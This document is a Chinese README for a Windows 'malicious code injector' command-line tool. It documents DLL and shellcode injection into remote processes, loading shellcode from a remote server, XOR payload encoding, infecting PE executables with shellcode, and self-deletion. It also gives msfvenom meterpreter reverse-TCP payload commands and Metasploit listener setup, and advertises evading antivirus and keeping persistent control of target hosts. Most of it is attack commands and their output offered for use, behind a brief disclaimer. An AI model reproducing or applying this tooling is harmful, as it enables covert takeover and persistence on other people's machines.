# 应用层恶意代码注入器

<br>

<div align=center>

![image](https://user-images.githubusercontent.com/52789403/224480378-709a99e3-60e5-405f-9ae3-b64261c43423.png)

</div>

<br>

<div align=center>

[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/LyMemory) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com)  [![OSCS Status](https://cdn.lyshark.com/archive/LyScript/OSCS.svg)](https://www.oscs1024.com/project/lyshark/LyMemory?ref=badge_small)

</div>

<br>

一款功能强大的应用层`恶意代码`注入器，该工具可用于向第三方进程内强制插入`DLL`模块，也可用于插入一段`ShellCode`反弹后门，或实现汇编级`Call`调用功能，在后渗透中，也可将后门直接注入到特定进程内存内而不会在磁盘中留下任何痕迹，注入成功后`Metasploit`即可获取目标主机控制权，只要对端不关机则权限会一直维持，由于`内存注入`无对应磁盘文件，所以也不会触发杀软报毒，是一款不错的命令行版通用注入工具，你值得拥有。

## 免责声明

该项目仅用于安全技术研究与交流，禁止用于非法用途，本人不参与任何护网活动的攻击方不做黑产，若在主机中溯源到本工具，与本人没有任何关系，本人不承担任何法律责任！

## API 接口调用

![image](https://user-images.githubusercontent.com/52789403/224482027-0e9e4490-dcbf-4eff-8940-c57abb1064c9.png)

本工具绿色无毒，下载后可将`LyInjector.exe`源程序拷贝到`C:\Windows\System32`目录下，方便用户在任何位置都可以直接调用，目前该工具具备`23`个子功能，如下是详细的功能参数列表。
```c
Microsoft Windows [版本 10.0.19042.1826]
(c) Microsoft Corporation。保留所有权利。

C:\Users\admin> LyInjector
 _            ___        _           _
| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __
| |  | | | |  | || '_ \ | |/ _ \/ __| __/ _ \| '__|
| |__| |_| |  | || | | || |  __/ (__| || (_) | |
|_____\__, | |___|_| |_|/ |\___|\___|\__\___/|_|
      |___/           |__/

----------------------------------------------------------
[*] 应用层恶意代码注入器
[+] 版本: 2.0.0
[+] 联系作者: me@lyshark.com
----------------------------------------------------------

  [+] 基础功能

         Show              显示当前所有可注入进程
         ShowDll           显示进程内的所有DLL模块
         Promote           尝试提升自身进程权限
         FreeDll           尝试卸载指定进程内的DLL模块
         GetFuncAddr       显示进程内特定模块内函数基址
         Delself           从系统中删除自身痕迹

  [+] 格式化功能

         Format            将字节数组格式化为一行并打印
         FormatFile        将字节数组格式化并写出到文件
         Xor               将文本中压缩后的字节数组进行异或并输出
         Xchg              将压缩后的字符串转为字节数组格式
         XorArray          将字节数组加密/解密为字节数组格式

  [+] 进程注入功能

         InjectDLL         注入DLL模块到特定进程内
         InjectSelfShell   注入字符串到自身进程并运行
         InjectArrayByte   注入字节数组到自身进程并运行
         FileInjectShell   从文件中读入字符串并注入运行
         InjectProcShell   注入字符串到远程进程并运行
         InjectWebShell    从远程加载字符串并注入自身进程
         AddSection        在PE文件中新增一个节区
         InsertShellCode   将ShellCode插入到PE中的指定位置处
         RepairShellOep    在ShellCode末尾增加跳转回原处的指令
         SetSigFlag        设置文件感染标志

  [+] 编码器

         EncodeInFile      从文件读入加密字符串并执行反弹
         EncodePidInFile   注入加密后的字符串到远程进程中
```

- Show 显示当前所有可注入进程

```c
C:\Users\admin> LyInjector Show

[*] PID：     4 | 位数：x64 | 进程名：System
[*] PID：   124 | 位数：x64 | 进程名：Registry
[*] PID：   588 | 位数：x64 | 进程名：smss.exe
[*] PID：   872 | 位数：x64 | 进程名：csrss.exe
[*] PID：   972 | 位数：x64 | 进程名：wininit.exe
[*] PID：   980 | 位数：x64 | 进程名：csrss.exe
[*] PID：   496 | 位数：x64 | 进程名：services.exe
[*] PID：  6624 | 位数：x32 | 进程名：lyshark.exe
[*] PID：  9196 | 位数：x64 | 进程名：SearchProtocolHost.exe
[*] PID： 11376 | 位数：x64 | 进程名：LyInjector.exe
```

- ShowDll 显示进程内的所有DLL模块

```c
C:\Users\admin> LyInjector ShowDll --proc lyshark.exe

[+] DLL名称:           USER32.dll | DLL基地址: 0x0000000076B70000
[+] DLL名称:        MSVCR120D.dll | DLL基地址: 0x000000006A3E0000
[+] DLL名称:         KERNEL32.dll | DLL基地址: 0x00000000773A0000
```

- Promote 尝试提升自身进程权限

```c
C:\Users\admin> LyInjector Promote

[+] 获取自身Token
[+] 查询进程特权
[*] 已提升为超级管理员
```

- FreeDll 尝试卸载指定进程内的DLL模块

```c
C:\Users\admin> LyInjector FreeDll --proc lyshark.exe --dll MSVCR120D.dll

[*] 模块卸载状态: 1
```

- GetFuncAddr 显示进程内特定模块内函数基址

```c
C:\Users\admin> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxA

[+] 函数地址: 0x76bf0ba0

C:\Users\admin> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxW

[+] 函数地址: 0x76bf10c0
```

- Format 将攻击载荷格式化为一行纯字符串

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector Format --path d://shellcode.txt

fce88f0000006031d2648b52308b520c89e58b521431ff0fb74a268b7228f0b5a2566a0053ffd5
```

- FormatFile 将攻击载荷格式化为一行并写出到文本

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector FormatFile --path d://shellcode.txt --output d://output.txt
[+] 已储存 => d://output.txt
```

- Xor 将文本中压缩后的字节数组进行异或并输出

```c
C:\Users\admin> LyInjector Xor --path d://output.txt --passwd lyshark

% &{{%ssssssuspr'quw{!vqps{!vqs {z&v{!vqrwpr%%s%!tw"qu{!tqq{%s!v"qvuu"ssvp%%'v
```

- Xchg 将压缩后的字符串转为字节数组格式
```c
C:\Users\admin> LyInjector Xchg --input d://output.txt --output d://array.txt
[+] 字节已转为双字节
[*] 已写出ShellCode列表 => d://array.txt

"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
```

- XorArray 将字节数组加密/解密为字节数组格式

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector XorArray --path d://shellcode.txt --passwd lyshark
unsigned char ShellCode[] =
"\xbf\xab\xcc\x43\x43\x43\x23\x72\x91\x27\xc8\x11\x73\xc8\x11\x4f"
"\xca\xa6\xc8\x11\x57\x72\xbc\x4c\xf4\x9\x65\xc8\x31\x6b\xb3"
"\xf6\xe1\x15\x29\x43\x10\xbc\x96";
```

- InjectDLL 注入DLL模块到特定进程内

```c
C:\Users\admin> LyInjector InjectDLL --proc lyshark.exe --dll d://hook.dll

[*] 模块 [ d://hook.dll ] 已被注入到 [ 6624 ] 进程
```

- InjectSelfShell 注入字符串到自身进程并运行

```c
C:\Users\admin> LyInjector InjectSelfShell --shellcode fce88f00002c201...

[+] 解码地址: 19db64
```

- InjectArrayByte 将字节数组注入到自身进程内

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector InjectArrayByte --path d://shellcode.txt
[+] 解码地址: 19df20
```

- FileInjectShell 将一行字符串注入到自身进程内

```c
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

C:\Users\admin> LyInjector FileInjectShell --path d://output_shellcode.txt

[+] 解码地址: 19df20
```

- InjectWebShell 从远程Web服务器加载字符串并注入到自身进程内

```c
192.168.1.100:80/shellcode.raw
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

C:\Users\admin> LyInjector InjectWebShell --address 192.168.1.100 --payload shellcode.raw
```

- EncodeInFile 直接注入加密后的攻击载荷到自身进程内

```c
C:\Users\admin> LyInjector Xor --path d://output_shellcode.txt --passwd lyshark

% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

C:\Users\admin> LyInjector EncodeInFile --path d://xor_shellcode.txt --passwd lyshark

[+] 解码ShellCode字节 => 708 bytes
[+] 格式化ShellCode字节地址 => 19df00
[*] 激活当前反弹线程 => 2a60000
```

- InjectProcShell 注入攻击载荷到远程进程

```c
C:\Users\admin> LyInjector InjectProcShell --pid 13372 --shellcode fce88f0000006031d2648b523089e...

[*] 开始注入进程PID => 13372
[+] 打开进程: 360
[+] 已设置权限: 3866624
[*] 创建线程ID => 352
```

- EncodePidInFile 注入加密后的攻击载荷

```c
% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

C:\Users\admin> LyInjector EncodePidInFile --pid 8384 --path d://xor_shellcode.txt --passwd lyshark

[+] 解码ShellCode字节 => 708 bytes
[+] 读入ShellCode长度 => 1687292
[*] 开始注入进程PID => 8384 长度 => 354
[+] 打开进程: 340
[+] 已设置权限: 12451840
[*] 创建线程ID => 356
```

- AddSection 在PE文件中新增一个节区

```c
C:\Users\admin> LyInjector AddSection --path d://lyshark.exe --section .hack --size 1024

[-] 当前DOS头: 0x2130000
[-] 当前NT头: 0x0000000002130108
[-] 定位当前节表首地址: 0x02130200
[+] 拷贝节名称: .hack
[+] 节表内存大小: 1024
[*] 节内存起始位置: 0x000B7000
[-] 节的文件大小: 4096
[*] 节的文件起始位置: 0x000A7000 => DEC: 684032
```

- InsertShellCode 将ShellCode插入到PE中的指定位置

```c
C:\Users\admin> LyInjector InsertShellCode --path d://lyshark.exe 
--shellcode d://shellcode.txt --offset 1233

0xFC 0xE8 0x8F 0x00 0x00 0x00 0x60 0x31 0xD2 0x64 0x8B 0x52 0x30 0x8B 0x52 0x0C
0x89 0xE5 0x8B 0x52 0x14 0x31 0xFF 0x0F 0xB7 0x4A 0x26 0x8B 0x72 0x28 0xF0 0xB5
0xA2 0x56 0x6A 0x00 0x53 0xFF 0xD5

[*] 已注入 ShellCode 到PE文件
[+] 注入起始FOA => 0x000004D1 <DEC = 1233 > 注入结束FOA => 0x000004F8 <DEC = 1272 >
```

- SetSigFlag 设置文件感染标志

```c
C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
[+] 文件已感染

C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
[-] 文件已被感染,无法重复感染.
```

- RepairShellOep 在ShellCode末尾增加跳转回原地址处的指令

```c
C:\Users\admin>LyInjector RepairShellOep --path d://lyshark.exe 
--start_offset 1230 --end_offset 1240

[+] 获取原OEP => 0x000D8865
[+] 在 ShellCode 尾部增加JMP跳转指令: 0x90 0x90 0x90 0x90 0xB8 0x65 0x88
[*] 已增加跳转到 0x000004D8 处的代码段
[+] 修正新入口地址: 0x0007C4CE
```

- Metasploit 生成载荷

通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
```BASH
32位载荷生成
[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c

64位载荷生成
[root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
后台侦听器的配置也分为`32`位与`6`4位，使用工具时需要与载荷的位数相对应。
```BASH
32位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit

64位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```

## 项目地址

https://github.com/lyshark/LyInjector
